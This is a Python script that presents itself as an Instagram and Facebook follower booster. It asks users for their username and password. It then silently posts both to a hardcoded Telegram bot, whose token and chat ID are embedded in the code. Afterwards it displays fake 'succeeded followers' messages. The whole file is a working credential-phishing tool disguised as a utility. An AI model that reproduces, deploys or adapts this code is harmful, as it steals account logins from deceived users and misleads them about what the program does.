import requests,os,time,random,sys

ID= '1268370511'

token='5366702455:AAF40RHfe-vrQ9ouj9Vd_dFhA9npzcbT8ho'

#_______________________________________

red=("\033[1;31m")

gr=('\033[1;32m')

gr1=('\033[1;38m')

gr2=('\033[1;33m')

gr3=('\033[1;29m')

gr4=('\033[1;33m')

gr5=('\033[1;39m')

def jalan (loop): 

    for x in loop +"\n": 

     sys.stdout.write (x) 

     sys.stdout.flush () 

     time.sleep(000.01000000)

print('\033[1;31m')

v=("""_____   _      ______      ________  __     ______  _    _

|_   _| | |    / __ \ \    / /  ____| \ \   / / __ \| |  | |

  | |   | |   | |  | \ \  / /| |__     \ \_/ / |  | | |  | |

  | |   | |   | |  | |\ \/ / |  __|     \   /| |  | | |  | |

 _| |_  | |___| |__| | \  /  | |____     | | | |__| | |__| |

|_____| |______\____/   \/   |______|    |_|  \____/ \____""")

jalan(v)

print(gr)

jalan('This is a tool that throws followers on Instagram and Facebook 100 and 500 and 250  followers only : ')

print(red+'_____________________________')

b1=(gr+'[1] Instagram')

b2=(gr+'[2] Facebook ')

b3=(gr+'[3] Information about tool ')

b4=(gr+'[4] Tool developer  ')

jalan(b1)

jalan(b2)

jalan(b3)

jalan(b4)

b5=input('choise number[1] from [4]:')

if b5 == '1':

	os.system('clear')	jalan(v)

	print('')

	r=('Please write your name and password')

	jalan(r)

	username=input(gr+'write your username: ')

	if username == '':

		print(red+'Error')

		sys.exit()

	password=input(gr+'write your password: ')

	if password == '':

		print(red+'Error')

		sys.exit()

	tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎

		\n- 𝑷𝑯 ➪ @{username} ✓\n- 𝑷𝑺 ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @P12333398 -K- @P12333398 ''')

	i = requests.post(tlg)

	os.system('clear')

	jalan('please wait ...... !!')

	os.system('clear')

	time.sleep(0.10)

	jalan(v)

	print (' ')

	jalan("Don't go out when you provide followers ok!")

	c1=('[1-] 100 followers ')

	c2=('[2-] 250 followers ')

	c3=('[3-] 500 followers ')

	jalan(c1)

	jalan(c2)

	jalan(c3)

	b6=input('please Choose unmber: ')

	if b6 ==b6:

		os.system('clear')

		jalan('Providing followers ......')

		jalan (red+'Error followers !')

		jalan(gr+'succeeded followers..\n'*250)

#______________facboke________

elif  b5 =="2":

	os.system('clear')

	jalan(v)

	print('')

	jalan('Please write your name and password')

	username=input(gr+'write your number: ')

	if username == '':

		print(red+'Error')

		sys.exit()

	password=input(gr+'write your password: ')

	if password == '':

		print(red+'Error')

		sys.exit()

	tlg = (f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= • 𝑯𝒆𝒍𝒍𝒐 - 𝒀𝒐𝒖𝑹 𝑯𝒖𝒏𝒕 ♔︎

		\n- 𝑷𝑯 ➪ @{username} ✓\n- 𝑷𝑺 ➪ {password} \n━━━━━━━━━━━━━\n• 𝐅𝐫𝐎𝐦 : @P12333398 -K- @P12333398 ''')

	i = requests.post(tlg)

	os.system('clear')

	jalan('please wait ...... !!')

	os.system('clear')

	time.sleep(0.10)

	jalan(v)

	print (' ')

	jalan("Don't go out when you provide followers")

	c1=('[1-] 100 followers ')

	c2=('[2-] 250 followers ')

	c3=('[3-] 500 followers ')

	jalan(c1)

	jalan(c2)

	jalan(c3)

	b6=input('please Choose unmber: ')

	if b6 ==b6:

		os.system('clear')

		jalan('Providing followers ......')

		jalan (red+'Error followers !')

		jalan(gr+'succeeded followers..\n'*250)

		

elif b5 == '3' :

	os.system('clear')

	jalan('These tools are used to create followers for Facebook and Instagram once in each account, and they prevent the account from being banned use one  ')

elif b5 == '4':

	import webbrowser

	webbrowser.open("https://api.whatsapp.com/send?phone=+249113997386")

else:

	jalan('Error??')
